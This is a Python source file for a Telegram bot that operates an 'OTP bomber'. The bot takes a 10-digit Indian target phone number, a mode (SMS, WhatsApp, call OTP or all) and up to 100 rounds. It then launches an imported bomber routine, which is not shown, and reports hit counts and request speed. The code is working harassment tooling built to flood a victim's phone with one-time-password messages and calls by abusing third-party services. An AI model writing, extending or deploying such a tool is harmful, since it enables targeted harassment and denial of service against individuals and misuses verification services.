import asyncio
import os
import logging
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters, ConversationHandler,
)
from bomber import run_bomber

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN    = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ.get("OWNER_ID", "0"))

WAIT_PHONE  = 1
WAIT_MODE   = 2
WAIT_ROUNDS = 3

active_jobs: dict[int, bool] = {}


# ── health server (keeps render happy) ──
class _Health(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *args):
        pass

def _keep_alive():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), _Health).serve_forever()


def is_authorized(user_id: int) -> bool:
    if OWNER_ID == 0:
        return True
    return user_id == OWNER_ID


def mode_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📱 SMS",      callback_data="SMS"),
            InlineKeyboardButton("💬 WhatsApp", callback_data="WA"),
        ],
        [
            InlineKeyboardButton("📞 Call OTP", callback_data="CALL"),
            InlineKeyboardButton("🔥 ALL",      callback_data="ALL"),
        ],
        [InlineKeyboardButton("❌ Cancel",      callback_data="CANCEL")],
    ])


def rounds_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("1",   callback_data="r1"),
            InlineKeyboardButton("5",   callback_data="r5"),
            InlineKeyboardButton("10",  callback_data="r10"),
        ],
        [
            InlineKeyboardButton("25",  callback_data="r25"),
            InlineKeyboardButton("50",  callback_data="r50"),
            InlineKeyboardButton("100", callback_data="r100"),
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="CANCEL")],
    ])


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    await update.message.reply_text(
        "💣 *OTP BOMBER BOT*\n\n"
        "Commands:\n"
        "/bomb — start a bomb session\n"
        "/stop — stop your running session\n"
        "/status — check if session is running\n"
        "/help — show this message",
        parse_mode="Markdown",
    )
    return ConversationHandler.END


async def bomb_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    uid = update.effective_user.id
    if active_jobs.get(uid):
        await update.message.reply_text("⚠️ Already running. /stop it first.")
        return ConversationHandler.END
    await update.message.reply_text(
        "📲 Send the *10-digit target number* (without +91):",
        parse_mode="Markdown",
    )
    return WAIT_PHONE


async def got_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid. Must be 10 digits. Try again:")
        return WAIT_PHONE
    ctx.user_data["phone"] = phone
    await update.message.reply_text(
        f"✅ Target: `+91{phone}`\n\nSelect *mode*:",
        parse_mode="Markdown",
        reply_markup=mode_keyboard(),
    )
    return WAIT_MODE


async def got_mode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "CANCEL":
        await query.edit_message_text("❌ Cancelled.")
        return ConversationHandler.END
    ctx.user_data["mode"] = query.data
    await query.edit_message_text(
        f"Mode: *{query.data}*\n\nHow many *rounds*?",
        parse_mode="Markdown",
        reply_markup=rounds_keyboard(),
    )
    return WAIT_ROUNDS


async def got_rounds(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "CANCEL":
        await query.edit_message_text("❌ Cancelled.")
        return ConversationHandler.END
    rounds = int(query.data.replace("r", ""))
    phone  = ctx.user_data["phone"]
    mode   = ctx.user_data["mode"]
    uid    = query.from_user.id
    active_jobs[uid] = True
    await query.edit_message_text(
        f"🚀 *Launching bomber!*\n\n"
        f"📱 Target : `+91{phone}`\n"
        f"🔧 Mode   : `{mode}`\n"
        f"🔁 Rounds : `{rounds}`\n\n"
        f"⏳ Running... /stop to abort.",
        parse_mode="Markdown",
    )
    asyncio.create_task(_run_and_report(query, uid, phone, mode, rounds))
    return ConversationHandler.END


async def _run_and_report(query, uid: int, phone: str, mode: str, rounds: int):
    try:
        stats = await run_bomber(phone, mode, rounds)
    except Exception as e:
        logger.error(f"Bomber error: {e}")
        stats = None
    finally:
        active_jobs.pop(uid, None)
    if stats:
        await query.message.reply_text(
            f"✅ *BOMB COMPLETE*\n\n"
            f"📱 Target  : `+91{phone}`\n"
            f"🔧 Mode    : `{mode}`\n"
            f"🔁 Rounds  : `{rounds}`\n\n"
            f"📊 *Results:*\n"
            f"  SMS  hits : `{stats['sms']}`\n"
            f"  WA   hits : `{stats['wa']}`\n"
            f"  CALL hits : `{stats['call']}`\n"
            f"  Total req : `{stats['total']}`\n"
            f"  Speed     : `{stats['rps']} req/s`",
            parse_mode="Markdown",
        )
    else:
        await query.message.reply_text("❌ Session ended with an error.")


async def stop_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if active_jobs.get(uid):
        active_jobs[uid] = False
        await update.message.reply_text("🛑 Stop signal sent.")
    else:
        await update.message.reply_text("ℹ️ No active session.")


async def status_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    running = active_jobs.get(uid, False)
    await update.message.reply_text(
        "🟢 Session ACTIVE" if running else "🔴 No active session"
    )


async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END


def main():
    # health server — render ko khush rakhta hai
    threading.Thread(target=_keep_alive, daemon=True).start()
    logger.info(f"Health server started on port {os.environ.get('PORT', 8080)}")

    app = Application.builder().token(TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("bomb", bomb_start)],
        states={
            WAIT_PHONE:  [MessageHandler(filters.TEXT & ~filters.COMMAND, got_phone)],
            WAIT_MODE:   [CallbackQueryHandler(got_mode)],
            WAIT_ROUNDS: [CallbackQueryHandler(got_rounds)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(CommandHandler("start",  start))
    app.add_handler(CommandHandler("help",   start))
    app.add_handler(CommandHandler("stop",   stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(conv)
    logger.info("Bot polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
